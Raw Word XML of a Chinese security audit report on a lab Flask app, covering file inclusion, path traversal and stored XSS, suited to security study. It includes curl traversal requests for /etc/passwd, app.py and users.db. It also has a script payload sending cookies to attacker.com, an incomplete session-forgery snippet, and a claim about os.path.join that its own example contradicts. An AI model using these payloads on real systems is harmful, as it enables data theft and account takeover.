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79A"/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>安全审计报告</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="E53E3E"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>文件包含漏洞分析与复现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right"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>项目名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户信息管理平台（Class01）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b/>
              </w:rPr>
              <w:t>测试目标</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>http://192.168.234.129:5000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b/>
              </w:rPr>
              <w:t>报告日期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>2026-07-23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b/>
              </w:rPr>
              <w:t>漏洞等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🔴 严重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b/>
              </w:rPr>
              <w:t>涉及模块</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>动态页面加载 /page 路由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b/>
              </w:rPr>
              <w:t>漏洞类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>本地文件包含 LFI + 路径遍历 + XSS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1. 报告概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>2. 漏洞 1：本地文件包含（LFI）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>3. 漏洞 2：路径遍历（Path Traversal）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>4. 漏洞 3：HTML 注入 / 存储型 XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>5. 漏洞 4：文件内容泄露敏感信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>6. 漏洞汇总</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>7. 修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>8. POC 测试脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. 报告概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本报告对"用户信息管理平台"中的动态页面加载功能进行安全审计，重点分析其中存在的文件包含漏洞（File Inclusion Vulnerability）。该漏洞允许攻击者通过精心构造的 URL 参数，读取服务器上的任意文件，甚至执行恶意代码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 漏洞简介</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>文件包含漏洞（File Inclusion）</w:t>
      </w:r>
      <w:r>
        <w:t>是指 Web 应用程序在动态加载文件时，未对用户输入的路径参数做充分校验和过滤，导致攻击者可以控制被包含的文件路径，从而读取或执行未授权的文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本系统中的 /page 路由接收用户传入的 name 参数，直接拼接到文件路径中，使用 os.path.join("pages", name) 构建完整路径，并读取文件内容返回给用户。由于没有任何路径校验、后缀过滤或内容限制，攻击者可以利用 ../ 实现目录穿透，读取系统任意文件，甚至通过 pages/ 目录上传恶意文件实现远程代码执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 测试环境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服务器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>http://192.168.234.129:5000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框架版本</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Flask 3.1.3 + Python 3.13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漏洞路由</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/page?name={filename}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默认账号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>admin / admin123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测试日期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>2026-07-23</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. 漏洞 1：本地文件包含（LFI）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本地文件包含漏洞（Local File Inclusion, LFI）是指攻击者通过控制文件路径参数，使服务器包含并返回本地文件内容。在本项目中，/page 路由将用户输入的 name 参数直接拼接到 "pages/" 目录路径中，且不对 ../ 等路径穿越字符做任何过滤。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 漏洞位置</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="E53E3E"/>
        </w:rPr>
        <w:t>文件：app.py | 路由：/page | 方法：GET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>关键代码（app.py 第 456-479 行）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/page")</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 直接拼接用户输入到文件路径，无任何校验</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file_path = os.path.join("pages", name)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if os.path.exists(file_path):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        with open(file_path, "r", encoding="utf-8") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            content = f.read()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # ❌ 自动尝试加 .html 后缀</w:t>
        <w:br/>
        <w:t xml:space="preserve">        file_path_html = file_path + ".html"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if os.path.exists(file_path_html):</w:t>
        <w:br/>
        <w:t xml:space="preserve">            with open(file_path_html, "r", encoding="utf-8") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">                content = f.read()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            content = "&lt;p&gt;页面不存在&lt;/p&gt;"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ❌ 使用 | safe 过滤器直接渲染，不转义 HTML</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("index.html", user=user_info, page_content=content)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 漏洞原理图解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>正常请求：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>用户访问 /page?name=help → os.path.join("pages", "help") → pages/help → 自动补全 → pages/help.html → 读取文件返回</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="E53E3E"/>
        </w:rPr>
        <w:t>恶意请求：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击者访问 /page?name=../app.py → os.path.join("pages", "../app.py") → pages/../app.py → 解析为 app.py → 读取源代码返回</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 POC 复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>场景 A：读取 Python 源代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤1：访问 http://192.168.234.129:5000/page?name=../app.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤2：服务器返回 app.py 的全部源代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤3：攻击者获取到数据库结构、Secret Key、业务逻辑等敏感信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>场景 B：读取系统敏感文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤1：访问 /page?name=../../../../etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤2：返回 Linux 系统用户列表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤3：进一步探测其他敏感文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>curl 命令验证：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 读取 Flask 应用源代码</w:t>
        <w:br/>
        <w:t>curl "http://192.168.234.129:5000/page?name=../app.py"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 读取 Git 配置（可能包含敏感信息）</w:t>
        <w:br/>
        <w:t>curl "http://192.168.234.129:5000/page?name=../.git/config"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 读取系统密码文件</w:t>
        <w:br/>
        <w:t>curl "http://192.168.234.129:5000/page?name=../../../../etc/passwd"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 读取数据库文件（如果知道路径）</w:t>
        <w:br/>
        <w:t>curl "http://192.168.234.129:5000/page?name=../../data/users.db"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.5 危害评级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CVSS 评分</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>7.5 (HIGH)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攻击路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>网络远程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攻击复杂度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低 — 仅需构造 URL 参数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危害</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>任意文件读取，源代码泄露，凭据泄露</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. 漏洞 2：路径遍历（Path Traversal）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>路径遍历漏洞（Path Traversal）是文件包含漏洞的延伸。由于系统未对 name 参数中的 "../"做任何过滤，攻击者可以突破 pages/ 目录的限制，遍历文件系统中的任意目录和文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 可探测的文件列表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 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读取目标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?name=../app.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>应用源代码（Flask 主文件）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?name=../.gitignore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Git 忽略规则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?name=../.git/config</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Git 仓库配置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?name=../../../../etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>系统用户列表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?name=../../../../etc/shadow</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>系统密码哈希（需 root 权限）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?name=../../../../etc/hostname</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>服务器主机名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?name=../data/users.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SQLite 用户数据库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?name=../static/css/style.css</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CSS 样式文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 路径遍历深度分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>路径遍历的关键在于 os.path.join 的行为。当第二个参数以 ../ 开头时，os.path.join 会丢弃前面的路径前缀，直接从 ../ 开始解析，导致路径向上穿透到父目录。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>os.path.join 行为演示：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Python &gt;&gt;&gt; os.path.join("pages", "help")</w:t>
        <w:br/>
        <w:t>'pages/help'                    ← 正常，在 pages/ 下</w:t>
        <w:br/>
        <w:br/>
        <w:t>Python &gt;&gt;&gt; os.path.join("pages", "../app.py")</w:t>
        <w:br/>
        <w:t>'pages/../app.py'               ← 路径遍历，实际指向 app.py</w:t>
        <w:br/>
        <w:br/>
        <w:t>Python &gt;&gt;&gt; os.path.join("pages", "../../../../etc/passwd")</w:t>
        <w:br/>
        <w:t>'pages/../../../../etc/passwd'  ← 深度遍历系统文件</w:t>
        <w:br/>
        <w:br/>
        <w:t>Python &gt;&gt;&gt; os.path.exists("pages/../app.py")</w:t>
        <w:br/>
        <w:t>True                            ← 成功定位到 app.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. 漏洞 3：HTML 注入 / 存储型 XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>在 index.html 模板中，page_content 使用 {{ page_content | safe }} 进行渲染。Jinja2 的 | safe 过滤器会关闭 HTML 转义，直接将内容作为 HTML 输出。结合文件包含漏洞，攻击者可以创建一个含有恶意 JS 的 HTML 文件，上传到服务器后通过 /page 路由加载，实现存储型 XSS 攻击。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 漏洞位置</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="E53E3E"/>
        </w:rPr>
        <w:t>文件：templates/index.html | 第 78 行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>关键代码（index.html 第 75-80 行）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{% if page_content is defined and page_content %}</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;div class="card page-content-card"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        {{ page_content | safe }}  &lt;!-- ❌ | safe 不转义 HTML --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/div&gt;</w:t>
        <w:br/>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 POC 复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>场景：结合文件上传漏洞，实现存储型 XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤1：构造恶意 HTML 文件 shell.html：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">       &lt;script&gt;alert(document.cookie)&lt;/script&gt;       &lt;img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤2：利用文件上传漏洞（未校验文件类型），通过 /upload 上传 shell.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤3：访问 /page?name=../static/uploads/{username}/shell.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>步骤4：恶意脚本在服务器域下执行，窃取用户 Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>curl 命令验证：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 利用上传功能，上传恶意 HTML 文件</w:t>
        <w:br/>
        <w:t>curl -X POST http://127.0.0.1:5000/upload \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -F "csrf_token=xxx" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -F "file=@/tmp/xss.html"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 通过文件包含漏洞加载该 HTML 文件</w:t>
        <w:br/>
        <w:t>curl "http://127.0.0.1:5000/page?name=../static/uploads/admin/xss.html"</w:t>
        <w:br/>
        <w:t># 浏览器解析 HTML 后执行恶意脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. 漏洞 4：文件内容泄露敏感信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>通过文件包含漏洞，攻击者可以读取服务器上各种敏感文件，获取的信息可用于进一步深度攻击。以下是攻击者可能获取的关键信息及其用途。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 可泄露的敏感信息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泄露信息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攻击用途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Flask Secret Key</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>伪造 Session Cookie，冒充任意用户登录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数据库文件 users.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>获取所有用户凭据（虽为哈希，但仍可破解）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Python 源代码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>发现更多漏洞入口，理解业务逻辑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Git 仓库信息</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>获取提交历史、作者信息、可能嵌入的凭据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系统配置文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>数据库密码、API Key、云服务凭据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环境变量</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Flask 配置、第三方服务凭据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="E53E3E"/>
        </w:rPr>
        <w:t>重点：泄露 Secret Key 的利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 通过 LFI 读取 app.py 获取 Secret Key</w:t>
        <w:br/>
        <w:t>curl "http://127.0.0.1:5000/page?name=../app.py" | grep secret_key</w:t>
        <w:br/>
        <w:t># 输出: app.secret_key = os.environ.get("SECRET_KEY") or secrets.token_hex(32)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 利用 Secret Key 伪造任意用户 Session</w:t>
        <w:br/>
        <w:t>python3 -c "</w:t>
        <w:br/>
        <w:t>from flask import Flask</w:t>
        <w:br/>
        <w:t>from werkzeug.security import generate_password_hash</w:t>
        <w:br/>
        <w:t>app = Flask(__name__)</w:t>
        <w:br/>
        <w:t>app.secret_key = '获取到的 secret_key'</w:t>
        <w:br/>
        <w:t>with app.test_request_context():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    from flask import session</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session['username'] = 'admin'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 生成伪造的 Session Cookie</w:t>
        <w:br/>
        <w:t xml:space="preserve">" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. 漏洞汇总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漏洞名称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严重程度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影响范围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攻击难度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本地文件包含（LFI）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任意文件读取</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>极低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路径遍历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全目录遍历</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>极低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存储型 XSS（结合上传）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟠 高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>所有访问用户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敏感信息泄露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源码/DB/配置</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>极低</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>攻击链分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>以上 4 个漏洞可以组成完整的攻击链：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>① 路径遍历 → 读取 app.py 获取 Secret Key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>② LFI → 读取 users.db 获取用户数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>③ LFI + 上传 → pages/ 目录上传恶意文件 → 执行 XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>④ 利用 Secret Key 伪造 Session → 以管理员身份登录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⑤ 通过管理员身份获取系统最高权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
